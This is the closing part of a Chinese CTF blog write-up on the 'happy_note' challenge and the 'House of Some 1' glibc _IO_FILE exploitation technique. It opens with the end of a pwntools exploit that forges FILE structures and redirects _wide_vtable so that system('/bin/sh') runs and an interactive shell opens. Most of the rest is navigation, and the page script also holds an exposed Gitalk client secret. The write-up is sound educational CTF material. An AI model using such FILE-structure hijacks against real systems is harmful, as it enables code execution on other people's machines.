fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps;</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>,                                        <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_IO_wfile_jumps_maybe_mmap - <span class="number">0x18</span>,    <span class="comment"># vtable</span></span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload1 = payload1  <span class="comment"># stderr._unused2 and stderr.vtable</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;b fileops.c:667&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(libc_system) + payload1)</span><br><span class="line"></span><br><span class="line">payload2 = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: u64(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>),</span><br><span class="line">    <span class="number">0x08</span>: libc_stdout,                          <span class="comment"># _IO_read_ptr  &gt; readable address,</span></span><br><span class="line">                                                <span class="comment">#                  or corrupu in fileops:537,</span></span><br><span class="line">                                                <span class="comment">#                  return *(unsigned char *) fp-&gt;_IO_read_ptr;</span></span><br><span class="line">    <span class="number">0x38</span>: libc_stdout,</span><br><span class="line">    <span class="number">0x40</span>: libc_stdout,                          <span class="comment"># _IO_buf_end   &gt; read n = 0,</span></span><br><span class="line">    <span class="number">0xa0</span>: libc_stdout + <span class="number">0xe0</span>,                   <span class="comment"># _wide_data    &gt; libc_stdout + 0xe0</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>,                                    <span class="comment"># _mode &lt; 0</span></span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0xe0</span>: libc_stdout - <span class="number">0x8</span> - <span class="number">0x20</span>          <span class="comment"># _wide_vtable  &gt; _IO_WUNDERFLOW -&gt; system</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">f&#x27;b *<span class="subst">&#123;<span class="built_in">hex</span>(libc_base + <span class="number">0x8dfa8</span>)&#125;</span>&#x27;</span>) <span class="keyword">and</span> sleep(T)   <span class="comment"># system</span></span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h1 id="历史笔记">历史笔记<a class="anchor" href="#历史笔记">·</a></h1>
<ul>
<li>
<p><a href="https://tover.xyz/p/PWN-Note_0-Reborn-and-ez-uaf/">PWN学习笔记vol.0 —— 复健与HNCTF 2022 WEEK4的ez_uaf</a></p>
</li>
<li>
<p><a href="https://tover.xyz/p/PWN-Note-1-Tcache-and-Setcontext/">PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf</a></p>
</li>
<li>
<p><a href="https://tover.xyz/p/PWN-Note-2-Off-by-One-and-Unlink/">PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer</a></p>
</li>
<li>
<p><a href="https://tover.xyz/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/">PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE</a></p>
</li>
<li>
<p><a href="https://tover.xyz/p/PWN-Note-4-House-of-Some-2/">PWN学习笔记vol.4 —— House of Some 2</a></p>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Tover. L</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tover.xyz/p/PWN-Note-5-happy-note-and-house-of-some-1/">https://tover.xyz/p/PWN-Note-5-happy-note-and-house-of-some-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tover.xyz" target="_blank">Tover's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/writeup/">writeup</a><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="/img/icon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://npm.elemecdn.com/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/p/PWN-Note-4-House-of-Some-2/"><img class="next-cover" src="/img/icon.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN学习笔记vol.4 —— House of Some 2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/p/2024-ycb/" title="2024羊城杯的部分WP"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-12</div><div class="title">2024羊城杯的部分WP</div></div></a></div><div><a href="/p/PWN-Note_0-Reborn-and-ez-uaf/" title="PWN学习笔记vol.0 —— 复健与HNCTF 2022 WEEK4的ez_uaf"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-22</div><div class="title">PWN学习笔记vol.0 —— 复健与HNCTF 2022 WEEK4的ez_uaf</div></div></a></div><div><a href="/p/PWN-Note-1-Tcache-and-Setcontext/" title="PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-08</div><div class="title">PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf</div></div></a></div><div><a href="/p/PWN-Note-2-Off-by-One-and-Unlink/" title="PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-17</div><div class="title">PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer</div></div></a></div><div><a href="/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/" title="PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-20</div><div class="title">PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE</div></div></a></div><div><a href="/p/PWN-Note-4-House-of-Some-2/" title="PWN学习笔记vol.4 —— House of Some 2"><img class="cover" src="/img/icon.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="title">PWN学习笔记vol.4 —— House of Some 2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tover. L</div><div class="author-info__description">套娃. <br/> Know nothing about Crypto. <br/> Cryer in (old -> new)： <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/23657'>Sloth</a> <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/224936'>S1uM4i</a> <br/> <a target="_blank" rel="noopener" href='https://ctftime.org/team/194221'>1997</a> <br/></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ToverPomelo" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:q664514882@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">评论挂很久了，估计是Gitalk网络挂了，有空再修......如果有的话</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%EF%BC%88NG%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">失败的攻击思路（NG）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-1-%E5%8A%AB%E6%8C%81tcache-perthread-struct"><span class="toc-number">2.1.1.</span> <span class="toc-text">Part.1 劫持tcache_perthread_struct</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-2-%E6%B3%84%E9%9C%B2heap-base"><span class="toc-number">2.1.2.</span> <span class="toc-text">Part.2 泄露heap_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-3-%E6%B3%84%E9%9C%B2libc-base"><span class="toc-number">2.1.3.</span> <span class="toc-text">Part.3 泄露libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-4-%E7%84%B6%E5%90%8E%E5%91%A2"><span class="toc-number">2.1.4.</span> <span class="toc-text">Part.4 然后呢</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">成功的攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-1-%E6%B3%84%E9%9C%B2heap-base"><span class="toc-number">2.2.1.</span> <span class="toc-text">Part.1 泄露heap_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-2-%E6%B3%84%E9%9C%B2libc-base"><span class="toc-number">2.2.2.</span> <span class="toc-text">Part.2 泄露libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-3-%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-number">2.2.3.</span> <span class="toc-text">Part.3 构造任意写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Part-4-House-of-Some-1"><span class="toc-number">2.2.4.</span> <span class="toc-text">Part.4 House of Some 1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Some-1"><span class="toc-number">3.</span> <span class="toc-text">House of Some 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exit%E9%93%BE"><span class="toc-number">3.1.</span> <span class="toc-text">exit链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E6%AC%A1%E6%89%A7%E8%A1%8C%EF%BC%88%E8%87%AA%E6%8C%81%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">多次执行（自持）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#write%E5%92%8Cread"><span class="toc-number">3.3.</span> <span class="toc-text">write和read</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8write"><span class="toc-number">3.3.1.</span> <span class="toc-text">如何调用write</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8read"><span class="toc-number">3.3.2.</span> <span class="toc-text">如何调用read</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#IO-new-file-underflow%EF%BC%88NG%EF%BC%89"><span class="toc-number">3.3.2.1.</span> <span class="toc-text">_IO_new_file_underflow（NG）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Apple-2"><span class="toc-number">3.3.2.2.</span> <span class="toc-text">House of Apple 2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-Illusion"><span class="toc-number">3.3.2.3.</span> <span class="toc-text">House of Illusion</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">3.3.2.4.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#happy-note%EF%BC%88revisit%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">happy_note（revisit）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-1-%E5%86%99%E5%85%A5fp0"><span class="toc-number">4.1.</span> <span class="toc-text">Part.1 写入fp0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-2-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80"><span class="toc-number">4.2.</span> <span class="toc-text">Part.2 泄露栈地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-3-%E7%A1%AE%E5%AE%9Arop%E5%9C%B0%E5%9D%80"><span class="toc-number">4.3.</span> <span class="toc-text">Part.3 确定rop地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Part-4-%E5%86%99%E5%85%A5rop"><span class="toc-number">4.4.</span> <span class="toc-text">Part.4 写入rop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83Exp"><span class="toc-number">5.</span> <span class="toc-text">参考Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%B1%E8%B4%A5%E4%BE%8B%E5%AD%90%E7%9A%84Exp%EF%BC%88NG%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">失败例子的Exp（NG）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96House-of-Some-1%E7%9A%84Exp"><span class="toc-number">5.2.</span> <span class="toc-text">自动化House of Some 1的Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8House-of-Some-1%E7%9A%84Exp"><span class="toc-number">5.3.</span> <span class="toc-text">手动House of Some 1的Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Some-2"><span class="toc-number">5.4.</span> <span class="toc-text">House of Some 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89-wide-vtable%E6%A3%80%E6%9F%A5%E7%9A%84HoS2"><span class="toc-number">5.5.</span> <span class="toc-text">没有_wide_vtable检查的HoS2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E7%AC%94%E8%AE%B0"><span class="toc-number">6.</span> <span class="toc-text">历史笔记</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/p/PWN-Note-5-happy-note-and-house-of-some-1/" title="PWN学习笔记vol.5 —— happy_note和House of Some 1"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN学习笔记vol.5 —— happy_note和House of Some 1"/></a><div class="content"><a class="title" href="/p/PWN-Note-5-happy-note-and-house-of-some-1/" title="PWN学习笔记vol.5 —— happy_note和House of Some 1">PWN学习笔记vol.5 —— happy_note和House of Some 1</a><time datetime="2025-03-10T11:51:26.000Z" title="发表于 2025-03-10 19:51:26">2025-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/PWN-Note-4-House-of-Some-2/" title="PWN学习笔记vol.4 —— House of Some 2"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN学习笔记vol.4 —— House of Some 2"/></a><div class="content"><a class="title" href="/p/PWN-Note-4-House-of-Some-2/" title="PWN学习笔记vol.4 —— House of Some 2">PWN学习笔记vol.4 —— House of Some 2</a><time datetime="2025-02-27T11:36:54.000Z" title="发表于 2025-02-27 19:36:54">2025-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/" title="PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE"/></a><div class="content"><a class="title" href="/p/PWN-Note-3-Tcache-in-Libc-2-34-and-IO-File/" title="PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE">PWN学习笔记vol.3 —— Libc-2.34的Tcache机制和_IO_FILE</a><time datetime="2025-02-20T10:23:40.000Z" title="发表于 2025-02-20 18:23:40">2025-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/PWN-Note-2-Off-by-One-and-Unlink/" title="PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer"/></a><div class="content"><a class="title" href="/p/PWN-Note-2-Off-by-One-and-Unlink/" title="PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer">PWN学习笔记vol.2 —— Off by one、Unlink和巅峰极客 2022的smallcontainer</a><time datetime="2025-02-17T11:14:24.000Z" title="发表于 2025-02-17 19:14:24">2025-02-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/p/PWN-Note-1-Tcache-and-Setcontext/" title="PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf"/></a><div class="content"><a class="title" href="/p/PWN-Note-1-Tcache-and-Setcontext/" title="PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf">PWN学习笔记vol.1 —— Tcache、setcontext和CISCN 2021初赛的silverwolf</a><time datetime="2025-02-08T11:29:34.000Z" title="发表于 2025-02-08 19:29:34">2025-02-08</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(6.6deg, #0042bebb, #8e5690bb, #18466ebb, #000347bb)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2025 By Tover. L</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://c10udlnk.top/">二进制是密码学人的自我修养 =v=</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.4.0/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '4989f2182ba1c60d6a7a',
      clientSecret: '80988778d911dff7e85489411dde0cce80d72e83',
      repo: 'ToverPomelo.github.io',
      owner: 'ToverPomelo',
      admin: ['ToverPomelo'],
      id: '41deca08f496c0eb4f30b20ca206ceac',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: true,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.4.0/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
    <div class="myspine-spine-widget"></div>
    <script src="/js/myspine/spine-widget.js"></script>
    <script src="/js/myspine/spine-skeleton-binary.js"></script>
    <script src="/js/myspine/myspine.js"></script>
    <link type="text/css" href="/css/_third-party/myspine.css"></link>
    <script>
        new MySpine({
            spineDir: "/spine_models/",
            models: [{"name":"sd_21miku_normal_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_band_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_idol_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_night_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_street_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"},{"name":"sd_21miku_wonder_r/","skin":"default","atlas":"sekai_atlas.atlas","skeleton":"sekai_atlas.skel"}],
            styles: {"widget":{"width":"200px","height":"200px"},"voiceText":{"color":"#e6e6e6"}},
            behaviors: {"start":{"animation":"w_emu_run01_f","voice":"","text":"Ohhhhh好耶"},"idle":{"maxMinutes":1,"animations":[{"name":"m_cool_idle01_f","loop":false},{"name":"m_cool_joy01_f","loop":false},{"name":"m_happy_idle01_f","loop":false},{"name":"m_happy_joy01_f","loop":false},{"name":"m_normal_idle01_f","loop":false},{"name":"m_normal_joy01_f","loop":false},{"name":"m_staff_idle01_f","loop":false},{"name":"n_general_wait_01_f","loop":false},{"name":"pose_default","loop":false},{"name":"u_vbsmen_battledore00_f","loop":false},{"name":"u_vbswomen_battledore00_f","loop":false},{"name":"w_adult_idle01_f","loop":false},{"name":"w_adult_joy01_f","loop":false},{"name":"w_cool_idle01_f","loop":false},{"name":"w_cool_joy01_f","loop":false},{"name":"w_cute_idle01_f","loop":false},{"name":"w_cute_joy01_f","loop":false},{"name":"w_happy_idle01_f","loop":false},{"name":"w_happy_joy01_f","loop":false},{"name":"w_normal_idle01_f","loop":false},{"name":"w_normal_joy01_f","loop":false},{"name":"w_pure_idle01_f","loop":false},{"name":"w_pure_joy01_f","loop":false},{"name":"w_staff_idle01_f","loop":false}],"voices":[{"voice":"","text":"不买立省百分百"}]},"interact":{"maxPlaySec":3,"animations":[{"name":"w_normal_joy01_b","loop":false},{"name":"m_cool_angry01_f","loop":false},{"name":"m_cool_doubt01_f","loop":false},{"name":"m_cool_laugh01_f","loop":false},{"name":"m_cool_listen01_f","loop":false},{"name":"m_cool_sad01_f","loop":false},{"name":"m_cool_surprise01_f","loop":false},{"name":"m_cool_talk01_f","loop":false},{"name":"m_happy_angry01_f","loop":false},{"name":"m_happy_doubt01_f","loop":false},{"name":"m_happy_laugh01_f","loop":false},{"name":"m_happy_listen01_f","loop":false},{"name":"m_happy_sad01_f","loop":false},{"name":"m_happy_surprise01_f","loop":false},{"name":"m_happy_talk01_f","loop":false},{"name":"m_normal_angry01_f","loop":false},{"name":"m_normal_doubt01_f","loop":false},{"name":"m_normal_laugh01_f","loop":false},{"name":"m_normal_listen01_f","loop":false},{"name":"m_normal_surprise01_f","loop":false},{"name":"m_normal_talk01_f","loop":false},{"name":"m_normal_walk01_b","loop":false},{"name":"m_normal_walk01_f","loop":false},{"name":"m_tsukasa_run01_f","loop":false},{"name":"n_general_walk_01_b","loop":false},{"name":"n_general_walk_01_f","loop":false},{"name":"u_liondancerobot_run_01_f","loop":false},{"name":"u_liondancerobot_run_02_f","loop":false},{"name":"u_vbsmen_battledore01_f","loop":false},{"name":"u_vbsmen_battledore02_f","loop":false},{"name":"u_vbsmen_battledore03_f","loop":false},{"name":"u_vbsmen_battledore04_f","loop":false},{"name":"u_vbswomen_battledore01_f","loop":false},{"name":"u_vbswomen_battledore02_f","loop":false},{"name":"u_vbswomen_battledore03_f","loop":false},{"name":"u_vbswomen_battledore04_f","loop":false},{"name":"w_adult_angry01_f","loop":false},{"name":"w_adult_doubt01_f","loop":false},{"name":"w_adult_laugh01_f","loop":false},{"name":"w_adult_listen01_f","loop":false},{"name":"w_adult_sad01_f","loop":false},{"name":"w_adult_surprise01_f","loop":false},{"name":"w_adult_talk01_f","loop":false},{"name":"w_cool_angry01_f","loop":false},{"name":"w_cool_doubt01_f","loop":false},{"name":"w_cool_laugh01_f","loop":false},{"name":"w_cool_listen01_f","loop":false},{"name":"w_cool_sad01_f","loop":false},{"name":"w_cool_surprise01_f","loop":false},{"name":"w_cool_talk01_f","loop":false},{"name":"w_cute_angry01_f","loop":false},{"name":"w_cute_angry02_f","loop":false},{"name":"w_cute_doubt01_f","loop":false},{"name":"w_cute_laugh01_f","loop":false},{"name":"w_cute_listen01_f","loop":false},{"name":"w_cute_sad01_f","loop":false},{"name":"w_cute_surprise01_f","loop":false},{"name":"w_cute_talk01_f","loop":false},{"name":"w_emu_run02_f","loop":false},{"name":"w_happy_angry01_f","loop":false},{"name":"w_happy_angry02_f","loop":false},{"name":"w_happy_doubt01_f","loop":false},{"name":"w_happy_doubt02_f","loop":false},{"name":"w_happy_laugh01_f","loop":false},{"name":"w_happy_listen01_f","loop":false},{"name":"w_happy_sad01_f","loop":false},{"name":"w_happy_surprise01_f","loop":false},{"name":"w_happy_talk01_f","loop":false},{"name":"w_normal_laugh01_f","loop":false},{"name":"w_normal_listen01_f","loop":false},{"name":"w_normal_talk01_f","loop":false},{"name":"w_normal_walk01_b","loop":false},{"name":"w_normal_walk01_f","loop":false},{"name":"w_pure_angry01_f","loop":false},{"name":"w_pure_doubt01_f","loop":false},{"name":"w_pure_laugh01_f","loop":false},{"name":"w_pure_listen01_f","loop":false},{"name":"w_pure_sad01_f","loop":false},{"name":"w_pure_surprise01_f","loop":false},{"name":"w_pure_talk01_f","loop":false},{"name":"z_mesh_templete","loop":false},{"name":"z_test_F_negi01","loop":false}],"voices":[{"voice":"","text":"哈茨捏米库 迭矢"}]}}
        });
    </script>
    <!-- hexo injector body_end end --></body></html>